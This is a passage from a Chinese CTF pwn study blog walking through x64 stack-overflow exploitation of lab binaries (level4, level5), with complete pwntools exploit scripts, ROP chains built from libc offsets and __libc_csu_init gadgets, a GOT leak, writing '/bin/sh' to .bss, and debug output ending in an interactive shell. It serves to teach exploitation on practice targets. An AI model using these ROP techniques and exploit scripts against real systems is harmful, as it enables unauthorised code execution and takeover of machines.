。<br><strong>需要注意的是这个和在libc文件中找system，/bin/sh一样这个是偏移量，但我们不慌，知道system绝对地址就可以算出pop rid的地址.</strong></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>binsh_offset <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#0x000000000002155f : pop rdi ; ret</span>pop_ret_offset <span class="token operator">=</span> <span class="token number">0x000000000002155f</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level4'</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"##########get system########"</span>system_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"##########the system########"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> system_addr <span class="token operator">+</span> binsh_offset<span class="token keyword">print</span> <span class="token string">"##########the binsh########"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>pop_ret_addr <span class="token operator">=</span> system_addr <span class="token operator">+</span> pop_ret_offset<span class="token keyword">print</span> <span class="token string">"##########the pop rdi ret########"</span> <span class="token operator">+</span>str<span class="token punctuation">(</span>pop_ret_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x0000000000400585 : ret</span>payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000400585</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x000000000012188b : pop rax ; pop rdi ; call rax</span>ppc_offset <span class="token operator">=</span> <span class="token number">0x000000000012188b</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>ppc_addr <span class="token operator">=</span> ppc_offset <span class="token operator">+</span> system_addrpayload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>ppc_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>注意到，我的payload有两个都可行。payload1 就是我们首先想到的思路，还放了一个p64(0x0000000000400585)，没错在执行system函数遇到了堆栈不平衡（日了狗了）<br>payload2 <strong>是想到了call指令来执行system函数（call 要放got地址）。pop rax 将system地址放入rax ，pop rdi将参数/bin/sh地址放入rdi，call rax：执行！（没有遇到堆栈步平衡问题，感觉以后可以多用call）</strong></p><h3 id="本地测试结果"><a href="#本地测试结果" class="headerlink" title="本地测试结果"></a>本地测试结果</h3><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x1c bytes:    <span class="token string">'0x7ffff782f440\n'</span>    <span class="token string">'Hello, World\n'</span><span class="token comment" spellcheck="true">##########the system########140737345942592</span><span class="token comment" spellcheck="true">##########the binsh########140737347403418</span><span class="token comment" spellcheck="true">##########the pop rdi ret########140737345754463</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0xa1 bytes:    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│    *    00000080  41 41 41 41  41 41 41 41  8b 18 90 f7  ff 7f 00 00  │AAAA│AAAA│····│····│    00000090  40 f4 82 f7  ff 7f 00 00  9a 3e 99 f7  ff 7f 00 00  │@···│····│·<span class="token operator">></span>··│····│    000000a0  0a                                                  │·│    000000a1<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode$ <span class="token function">whoami</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x7 bytes:    <span class="token string">'whoami\n'</span><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x7 bytes:    <span class="token string">'hunter\n'</span>hunter$  </code></pre><h2 id="4：level5–通用gadgets"><a href="#4：level5–通用gadgets" class="headerlink" title="4：level5–通用gadgets"></a>4：level5–通用gadgets</h2><p><strong>因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。</strong></p><p>level3和level4的程序都留了一些辅助函数在程序中，这次我们将这些辅助函数去掉再来挑战一下。目标程序level5.c如下：</p><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">void</span> <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">write</span><span class="token punctuation">(</span>STDOUT_FILENO<span class="token punctuation">,</span> <span class="token string">"Hello, World\n"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>没错你只有read和write函数和蒸米X86的level3 是一样的</p><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段, 最后调用system(“/bin/sh”)。<br>因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。<br>我们使用ROPgadget并没有找到类似于pop rdi, ret,pop rsi, ret这样的gadgets。那应该怎么办呢？<strong>其实在x64下有一些万能的gadgets可以利用。比如说我们用objdump -d -Mintel level5观察一下__libc_csu_init()这个函数。</strong><br><strong>一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。</strong></p><pre class=" language-bash"><code class="language-bash">00000000004005a0 <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span>:  4005a0:    48 89 6c 24 d8           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x28<span class="token punctuation">]</span>,rbp  4005a5:    4c 89 64 24 e0           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x20<span class="token punctuation">]</span>,r12  4005aa:    48 8d 2d 73 08 20 00     lea    rbp,<span class="token punctuation">[</span>rip+0x200873<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 600e24 &lt;__init_array_end></span>  4005b1:    4c 8d 25 6c 08 20 00     lea    r12,<span class="token punctuation">[</span>rip+0x20086c<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 600e24 &lt;__init_array_end></span>  4005b8:    4c 89 6c 24 e8           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x18<span class="token punctuation">]</span>,r13  4005bd:    4c 89 74 24 f0           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x10<span class="token punctuation">]</span>,r14  4005c2:    4c 89 7c 24 f8           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x8<span class="token punctuation">]</span>,r15  4005c7:    48 89 5c 24 d0           mov    QWORD PTR <span class="token punctuation">[</span>rsp-0x30<span class="token punctuation">]</span>,rbx  4005cc:    48 83 ec 38              sub    rsp,0x38  4005d0:    4c 29 e5                 sub    rbp,r12  4005d3:    41 89 fd                 mov    r13d,edi  4005d6:    49 89 f6                 mov    r14,rsi  4005d9:    48 c1 fd 03              sar    rbp,0x3  4005dd:    49 89 d7                 mov    r15,rdx  4005e0:    e8 1b fe ff ff           call   400400 <span class="token operator">&lt;</span>_init<span class="token operator">></span>  4005e5:    48 85 ed                 <span class="token function">test</span>   rbp,rbp  4005e8:    74 1c                    je     400606 <span class="token operator">&lt;</span>__libc_csu_init+0x66<span class="token operator">></span>  4005ea:    31 db                    xor    ebx,ebx  4005ec:    0f 1f 40 00              nop    DWORD PTR <span class="token punctuation">[</span>rax+0x0<span class="token punctuation">]</span>  4005f0:    4c 89 fa                 mov    rdx,r15              <span class="token comment" spellcheck="true">#关注点</span>  4005f3:    4c 89 f6                 mov    rsi,r14  4005f6:    44 89 ef                 mov    edi,r13d  4005f9:    41 ff 14 <span class="token function">dc</span>              call   QWORD PTR <span class="token punctuation">[</span>r12+rbx*8<span class="token punctuation">]</span>  4005fd:    48 83 c3 01              add    rbx,0x1  400601:    48 39 eb                 <span class="token function">cmp</span>    rbx,rbp  400604:    75 ea                    jne    4005f0 <span class="token operator">&lt;</span>__libc_csu_init+0x50<span class="token operator">></span>  400606:    48 8b 5c 24 08           mov    rbx,QWORD PTR <span class="token punctuation">[</span>rsp+0x8<span class="token punctuation">]</span>     <span class="token comment" spellcheck="true">#关注点从rsp+8开始读取栈中数据</span>  40060b:    48 8b 6c 24 10           mov    rbp,QWORD PTR <span class="token punctuation">[</span>rsp+0x10<span class="token punctuation">]</span>  400610:    4c 8b 64 24 18           mov    r12,QWORD PTR <span class="token punctuation">[</span>rsp+0x18<span class="token punctuation">]</span>  400615:    4c 8b 6c 24 20           mov    r13,QWORD PTR <span class="token punctuation">[</span>rsp+0x20<span class="token punctuation">]</span>  40061a:    4c 8b 74 24 28           mov    r14,QWORD PTR <span class="token punctuation">[</span>rsp+0x28<span class="token punctuation">]</span>  40061f:    4c 8b 7c 24 30           mov    r15,QWORD PTR <span class="token punctuation">[</span>rsp+0x30<span class="token punctuation">]</span>  400624:    48 83 c4 38              add    rsp,0x38  400628:    c3                       ret      400629:    0f 1f 80 00 00 00 00     nop    DWORD PTR <span class="token punctuation">[</span>rax+0x0<span class="token punctuation">]</span></code></pre><p>** 从4005f0开始：**<br>    1 r15=&gt;rdx,r14=&gt;rsi ,r13d=&gt;edi<br>    2 call指令我们可以利用，即将rbx弄成0，r12放目标函数got地址<br>    3 因为要执行上面rbx会变成0，add指令后rbx=1<br>    4 cmp    rbx,rbp如果相等就不会执行jne所以要把rbp设为1<br>    5 然后是6个mov将从rsp+8开始把栈中数据放入，rbx，rbp，r12，r13，r14，r15<br>    6 rsp往高地址移动0x38（56）字节即移动7次<br>    7 ret用来控制跳转到4005f0目的是执行r12中的函数<br><strong>所以先用栈溢出将程序跳到400606读取我们构造的payload最后ret到4005f0来执行r12中的函数，因为程序会继续往下走再次ret我们可以控制跳转到main函数，准备下一次攻击。</strong></p><h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h3><p>我们先构造payload1，利用write()输出write在内存中的地址。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#rdx=r15,rsi=r14,rdi=edi=r13d,r12=write_got,rbx=0,rbp=1 ret=0x4005f0  ##注释在这种长exp显得尤为重要</span><span class="token comment" spellcheck="true">#write(rdi=1,rsi=write_got,rdx=8)</span>payload1 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>   <span class="token comment" spellcheck="true">#NULL</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># </span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>payload1 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span></code></pre><h3 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h3><p>用read()将system()的地址以及“/bin/sh”读入到.bss段内存中。bss可用readelf -S level5获取</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#rdx=r15,rsi=r14,rdi=edi=r13d,r12=read_got,rbx=0,rbp=1 ret=0x4005f0</span><span class="token comment" spellcheck="true">#read(rdi=0,rsi=bss_addr,rdx=16)  16字节是读取system的地址还有字符串/bin/sh\x00</span>payload2 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_read<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span> payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>payload2 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span></code></pre><h3 id="payload3"><a href="#payload3" class="headerlink" title="payload3"></a>payload3</h3><p>最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh\x00”保存在了.bss段首地址+8字节上。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#rdx=r15,rsi=r14,rdi=edi=r13d,r12=bss_addr,rbx=0,rbp=1 ret=0x4005f0</span><span class="token comment" spellcheck="true">#system(rdi=bss_addr + 8) rsi=0 rdx=0</span>payload3 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>payload3 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span></code></pre><h3 id="EXP（蒸米）"><a href="#EXP（蒸米）" class="headerlink" title="EXP（蒸米）"></a>EXP（蒸米）</h3><p>我本地测试遇到太多玄学问题了（很操蛋）</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'level5'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./level5'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p = remote('127.0.0.1',10001)</span>got_write <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"got_write: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span>got_read <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"got_read: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>got_read<span class="token punctuation">)</span>main <span class="token operator">=</span> <span class="token number">0x400564</span>off_system_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token keyword">print</span> <span class="token string">"off_system_addr: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>off_system_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span><span class="token comment" spellcheck="true">#write(rdi=1, rsi=write.got, rdx=4)</span>payload1 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>payload1 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"\n#############sending payload1#############\n"</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"write_addr: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>system_addr <span class="token operator">=</span> write_addr <span class="token operator">-</span> off_system_addr<span class="token keyword">print</span> <span class="token string">"system_addr: "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>bss_addr<span class="token operator">=</span><span class="token number">0x601028</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span><span class="token comment" spellcheck="true">#read(rdi=0, rsi=bss_addr, rdx=16)</span>payload2 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_read<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>payload2 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"\n#############sending payload2#############\n"</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/bin/sh\0"</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello, World\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span><span class="token comment" spellcheck="true">#system(rdi = bss_addr+8 = "/bin/sh")</span>payload3 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>payload3 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"\n#############sending payload3#############\n"</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><blockquote><p>蒸米原文：<br>要注意的是，当我们把程序的io重定向到socket上的时候，根据网络协议，因为发送的数据包过大，read()有时会截断payload，造成payload传输不完整造成攻击失败。这时候要多试几次即可成功。如果进行远程攻击的话，需要保证ping值足够小才行（局域网）。最终执行结果如下：</p></blockquote><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Started program <span class="token string">'./level5'</span>got_write: 0x601000got_read: 0x601008off_system_addr: 0xa1c40<span class="token comment" spellcheck="true">#############sending payload1#############</span>write_addr: 0x7f79d5779370system_addr: 0x7f79d56d7730<span class="token comment" spellcheck="true">#############sending payload2#############</span><span class="token comment" spellcheck="true">#############sending payload3#############</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode$ <span class="token function">whoami</span>mzheng</code></pre><h2 id="5：总结"><a href="#5：总结" class="headerlink" title="5：总结"></a>5：总结</h2><p><strong><em>原来pwn的艺术不是explosion，而是gadgets链构造，这种艺术我等凡人无法欣赏</em></strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>偶遇栈平衡</title>
      <link href="/2020/07/08/ou-yu-zhan-ping-heng/"/>
      <url>/2020/07/08/ou-yu-zhan-ping-heng/</url>
      
